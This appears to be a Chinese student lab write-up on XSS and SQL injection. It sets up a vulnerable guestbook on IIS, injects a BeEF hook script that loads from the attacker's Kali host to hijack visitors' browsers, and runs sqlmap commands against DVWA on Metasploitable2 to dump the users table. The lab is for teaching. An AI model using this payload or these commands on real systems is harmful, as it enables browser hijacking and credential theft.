---
title: XSS & SQL injection
date: 2020-12-16 04:11:50
categories: 
- Network Penetration
tags: 
- experiment
---

## 实验目的
了解什么是XSS；了解XSS攻击实施，理解防御XSS攻击的方法；了解SQL注入的基本原理；掌握PHP脚本访问MySQL数据库的基本方法；掌握程序设计中避免出现SQL注入漏洞的基本方法；掌握网站配置。
## 系统环境
Kali Linux 2、Windows Server
## 网络环境
交换网络结构
## 实验工具
 Beef；AWVS(Acunetix Web Vulnarability Scanner);SqlMAP；DVWA
## 实验步骤
### XSS部分：利用Beef劫持被攻击者客户端浏览器
#### 实验环境搭建。
角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建）
攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）；
被攻击者：访问留言簿网站，浏览器被劫持。
#### 搭建GustBook网站
在管理工具里打开Internet信息服务(IIS)管理器，在网站文件夹上新建网站，网站描述随意，ip地址为Windows Server的ip，端口80即可。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216012553878.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70)

选择路径的时候除了选取到文件夹还要注意要==允许访问匿名网站，否则检查不到漏洞==。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216013153551.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70)

权限给满满的。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216013315669.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70)

搭建完网站后更改网站目录权限，添加Everyone用户组并设置为完全控制。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020121601390350.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216014308226.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

然后还要改几个小选项。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216014607908.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216014615927.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)


#### 利用AWVS扫描留言簿网站
破解进入软件后，点击"File"--"New"--"Web Site Scan"来启动Scan Wizard界面
在Scan single website中输入网址：****，点击Next…………直到出表。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020121602051491.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216020536116.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216020542261.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216020547270.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)



最后结果如下，于error.asp和add.asp中分别有一个XSS漏洞。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216020902538.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216020912938.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020121602091967.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

#### Kali使用beef生成恶意代码
Kali-2020中现在不自带Beef，需要咱们自己安装，命令↓
`sudo apt-get install beef-xss`
然后进入文件夹↓
`cd /usr/share/beef-xss`
最后输入`./beef`就ok了。
第一次会提示不要用默认的账号密码的提示，我当时做完忘截图了……，不过报错提示是↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216024003548.jpg#pic_center)

按照提示中的文件进行修改 `sudo vim /etc/beef-xss/config.yaml`
(vim用法自行搜索）

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216024119857.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70)

在这里我把账号密码逆向设置，保存退出后再`./beef`。↑

**注**

这个如果是默认用户可能会导致开启失败，所以我们可以切换为root权限，再`./beef`。（如果本身就是以root开局，那就当我没说）

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216024558503.jpg#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216024616862.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

提示已经启动了，然后我就可以用kali的火狐浏览器打开链接`http://127.0.0.1:3000/ui/authentication`。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216024727800.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

输入之前设置的账号密码，进入这个页面。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216024828390.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

查看XSS脚本。↓
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216024921793.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

对方如果访问这个网站，对方的浏览器就会被劫持。

#### 访问http://留言簿网站/message.asp;将恶意代码写入网站留言板
**恶意代码：** 

```
<script src="http://Kali的IP地址:3000/hook.js"></script>
```
一开始使用10.34.80.233的那个ip是写死的，我在kali上访问不了，一开始我以为是端口的原因，我就换了个8888端口的，后来扫描发现kali和windows server不在一个网段里，查两者的网关发现两者网关都不一样。所以我就把windows server设为自动获取ip。再次`nmap -sP` ，两者在同一网段内，kali也可以访问留言簿了。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216040223380.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

看到这个页面发现我们可以说是成功了，看不见我们的html代码表示代码已被成功加载。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216040249939.jpg#pic_center)

#### 审核用户留言（非严谨）
刷新页面或者点击首页会出弹框。↓（也相当于管理员审核邮件了，但是我的beef用了几次就出问题了，就没模拟管理员审核的步骤。）

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216040641124.jpg#pic_center)

然后我们回到kali这边发现信息已经疯狂加载，红色部分的一直在重复，我就不截图了。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216040742922.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

可以看到很多信息，我们还可以干一些“活儿”。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216040817769.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

“活儿”↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216040944231.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

我们按照箭头指示更改链接为：青柠起始页，并==Execute==.↑

然后我们浏览留言簿页面就会加载为青柠起始页。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216041127884.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

#### 实验中XSS攻击属于哪种类型
实验中的XSS攻击属于注入型XSS攻击。
****

### SQL注入部分：DVWA+SQLmap+Mysql注入实战
实验环境搭建。启动Metasploitable2虚拟机。

 - 小准备，在Metasploitable2查一下的ip

Metasploitable2里的dvwa是搭建好的，直接在kali访问 `http://Metasploitable的IP/dvw`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216221018178.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

设置DVWA Security的等级为low

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216221232322.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

第一次输入1，结果如下。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216221455186.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYXBlcl9NWEJH,size_16,color_FFFFFF,t_70#pic_center)

第二次输入1’，结果如下。↓

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216221708590.jpg#pic_center)

报错说明有漏洞课钻空子。↑

用sqlmap搞事情，基本语法如下：

 - -u:指定目标URL，即注入点
 - --cookies：当前会话的cookies值
 - -b：获取数据库类型，检查数据库管理系统标识 
 - --current-db：获取当前数据库 
 - --current-user：获取当前数据库使用的用户
 - -string：当查询可用时来匹配页面中的字符串
 - -users：枚举DBMS用户
 - -password：枚举DBMS用户密码hash
 - dbs：枚举当前数据库
 - -D 数据库名：指定数据库
 - -tables：枚举指定数据库的所有表
 - -T：指定数据库中的数据表
 - --columns：获取列的信息
 - -C：枚举数据表中的列
 - --dump：存储数据表项


#### 实验准备
要用F12抓包获取cookie

==注：在遇到的所有的Y/N选择中，一直选Y就好了，三选的直接Enter。==
#### 枚举当前使用的数据库名称和用户名
查询当前数据库名称↓
`sqlmap -u "http://192.168.238.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" --current-db`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216222823966.jpg#pic_center)

查询当前数据库的使用者的用户名↓

`sqlmap -u "http://192.168.238.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" --current-user`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216222929718.jpg#pic_center)
#### 枚举数据库和指定数据库的数据表
枚举数据库↓
`sqlmap -u "http://192.168.238.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" -dbs`



![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216223127796.jpg#pic_center)

枚举指定数据库的数据表↓
`sqlmap -u "http://192.168.238.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979"  -D dvwa --tables`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216223001597.jpg#pic_center)
#### 获取指定数据库和表中所有列的信息
`sqlmap -u "http://192.168.238.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" -D dvwa --tables -T users -- columns`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216223232909.jpg#pic_center)
#### 枚举指定数据表中的所有用户名与密码,并down到本地
`sqlmap -u "http://192.168.238.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" -D dvwa --tables -T users -C user,password --dump`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201216223304982.jpg#pic_center)



